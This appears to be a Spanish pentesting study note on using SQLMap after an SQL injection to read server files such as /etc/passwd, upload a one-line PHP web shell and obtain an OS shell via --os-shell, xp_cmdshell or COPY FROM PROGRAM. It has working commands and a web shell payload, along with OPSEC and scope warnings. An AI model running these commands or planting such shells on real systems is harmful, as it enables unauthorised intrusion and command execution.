---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Descripción: "Con privilegios suficientes, SQLMap lleva la SQLi más allá de los datos: lee y escribe ficheros del servidor y, en el mejor caso, da una shell del sistema operativo"
Fecha de actualización: 2026-06-04
Nota previa: "[[05 - Bypass de protecciones web con SQLMap]]"
Nota siguiente:
Area: "[[SQLMap.base|SQLMap]]"
---
---

Con privilegios suficientes, SQLMap lleva la SQLi más allá de los datos: lee y escribe ficheros del servidor y, en el mejor caso, da una shell del sistema operativo. Automatiza lo que a mano se hace en las notas de [[07 - Lectura de archivos|lectura]] y [[08 - Escritura de archivos|escritura de ficheros]], pero las mismas restricciones (privilegio `FILE`, `secure_file_priv`, ser DBA) deciden si funciona.

# Comprobar privilegios primero

Sin DBA, casi nada de esto funciona. Se comprueba con `--is-dba`:

```shell-session
$ sqlmap -u "http://host/?id=1" --is-dba
current user is DBA: True
```

<mark style="background: #FFB8EBA6;">`current user is DBA: False` significa que la lectura/escritura de ficheros y la shell probablemente fallarán</mark> —y SQLMap lo confirma con un `no data retrieved` al intentar leer—.

# Leer ficheros

```shell-session
$ sqlmap -u "http://host/?id=1" --file-read "/etc/passwd"
```

SQLMap descarga el fichero a `~/.local/share/sqlmap/output/<host>/files/`. Internamente usa `LOAD DATA`/`LOAD_FILE`, que requiere privilegio `FILE`. Si la extracción falla, los switches `--hex` o `--no-cast` suelen arreglar problemas de codificación.

# Escribir ficheros → web shell

Mucho más restringido (permite RCE). Requiere `secure_file_priv` desactivado y permiso de escritura en el destino. Se prepara una web shell y se sube con `--file-write`/`--file-dest`:

```shell-session
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
$ sqlmap -u "http://host/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
$ curl "http://host/shell.php?cmd=id"
```

# `--os-shell`: shell interactiva directa

El switch estrella: <mark style="background: #ADCCFFA6;">`--os-shell` intenta darte una shell interactiva sin escribir manualmente la web shell</mark>:

```shell-session
$ sqlmap -u "http://host/?id=1" --os-shell --technique=E
os-shell> id
uid=33(www-data) gid=33(www-data)
```

Según el motor, usa una técnica distinta:
- **MySQL**: genera y sube un *shared object* propio (`.so`/`.dll`) que implementa las funciones `sys_exec`/`sys_eval` (técnica UDF, conceptualmente como `lib_mysqludf_sys` pero compilado por SQLMap), o sube un *file stager* + backdoor al webroot.
- **MSSQL**: abusa de [[10 - MSSQL ejecución de comandos con xp_cmdshell|`xp_cmdshell`]].
- **PostgreSQL**: usa [[08 - PostgreSQL lectura y escritura de archivos|`COPY ... FROM PROGRAM`]] o UDF.

> [!important]+
> Si `--os-shell` devuelve `No output`, fuerza una técnica con salida fiable: <mark style="background: #FFB86CA6;">`--technique=E` (error-based) o `U` (UNION) suelen funcionar donde la blind falla</mark>. SQLMap preguntará el lenguaje (PHP por defecto) y el webroot (puede buscarlo en ubicaciones comunes o por fuerza bruta); con `--batch` elige los valores por defecto. Relacionado: `--os-pwn` intenta una shell Meterpreter (requiere Metasploit instalado), y `--sql-shell`/`--sql-query` dan una consola SQL interactiva sin tocar el SO.

> [!warning]+
> **OPSEC crítico**: para lograr `--os-shell`, SQLMap **sube ficheros al servidor** —el binario UDF, un *file stager* (`tmpXXXX.php`) y un backdoor (`tmpYYYY.php`)— que quedan ahí. <mark style="background: #FF5582A6;">Son artefactos detectables y persistentes que debes eliminar al terminar</mark> (anota sus nombres del log de SQLMap y bórralos vía la propia shell). En bug bounty, escribir en el servidor suele exceder el alcance: confirma el RCE con un comando inocuo y no dejes shells.

> [!warning]+
> **Realidad 2026**: la cadena `--os-shell` en MySQL es **rara** —exige DBA, `secure_file_priv` permisivo y webroot escribible, combinación poco frecuente—. Es bastante más viable en **MSSQL** (`xp_cmdshell`, si está habilitado) y **PostgreSQL** (`COPY FROM PROGRAM` con superusuario), que se explotan a mano en los módulos de [[01 - Introducción a Blind SQL Injection|Blind]] y SQLi avanzado. SQLMap es cómodo, pero entender la técnica manual subyacente es lo que permite explotar cuando la automatización falla.

Con esto se cubre la funcionalidad principal de SQLMap. El siguiente reto del path son las inyecciones **sin salida visible**, donde la automatización ayuda pero la comprensión manual es imprescindible: [[01 - Introducción a Blind SQL Injection|Blind SQL Injection]].
